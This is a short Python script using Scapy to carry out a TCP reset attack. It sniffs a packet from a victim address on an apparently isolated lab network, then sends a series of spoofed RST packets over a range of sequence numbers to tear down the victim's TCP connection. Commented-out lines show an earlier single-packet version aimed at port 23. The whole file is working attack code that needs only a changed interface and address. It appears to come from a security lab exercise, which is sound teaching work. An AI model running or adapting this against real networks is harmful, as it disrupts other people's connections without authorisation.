#!/usr/bin/env python3
from scapy.all import *

# seq=4140445666

# ip = IP(src="10.9.0.6", dst="10.9.0.5")
# tcp = TCP(sport=23, dport=23, flags="R", seq=seq, ack=0) 
# pkt = ip/tcp
# ls(pkt)
# send(pkt,verbose=0)

win=512
tcp_rst_count = 10
victim_ip = "10.9.0.6"
your_iface = 'br-0a1deadc53a1'

# get a tcp packet by sniffing WiFi
t = sniff(iface=your_iface, count=1,
          lfilter=lambda x: x.haslayer(TCP)
          and x[IP].src == victim_ip)
t = t[0]
tcpdata = {
    'src': t[IP].src,
    'dst': t[IP].dst,
    'sport': t[TCP].sport,
    'dport': t[TCP].dport,
    'seq': t[TCP].seq,
    'ack': t[TCP].ack
}
max_seq = tcpdata['ack'] + tcp_rst_count * win
seqs = range(tcpdata['ack'], max_seq, int(win / 2))
p = IP(src=tcpdata['dst'], dst=tcpdata['src']) / \
            TCP(sport=tcpdata['dport'], dport=tcpdata['sport'],
            flags="R", window=win, seq=seqs[0])

for seq in seqs:
    p.seq = seq
    send(p, verbose=0, iface=your_iface)
    print('tcp reset attack finish')
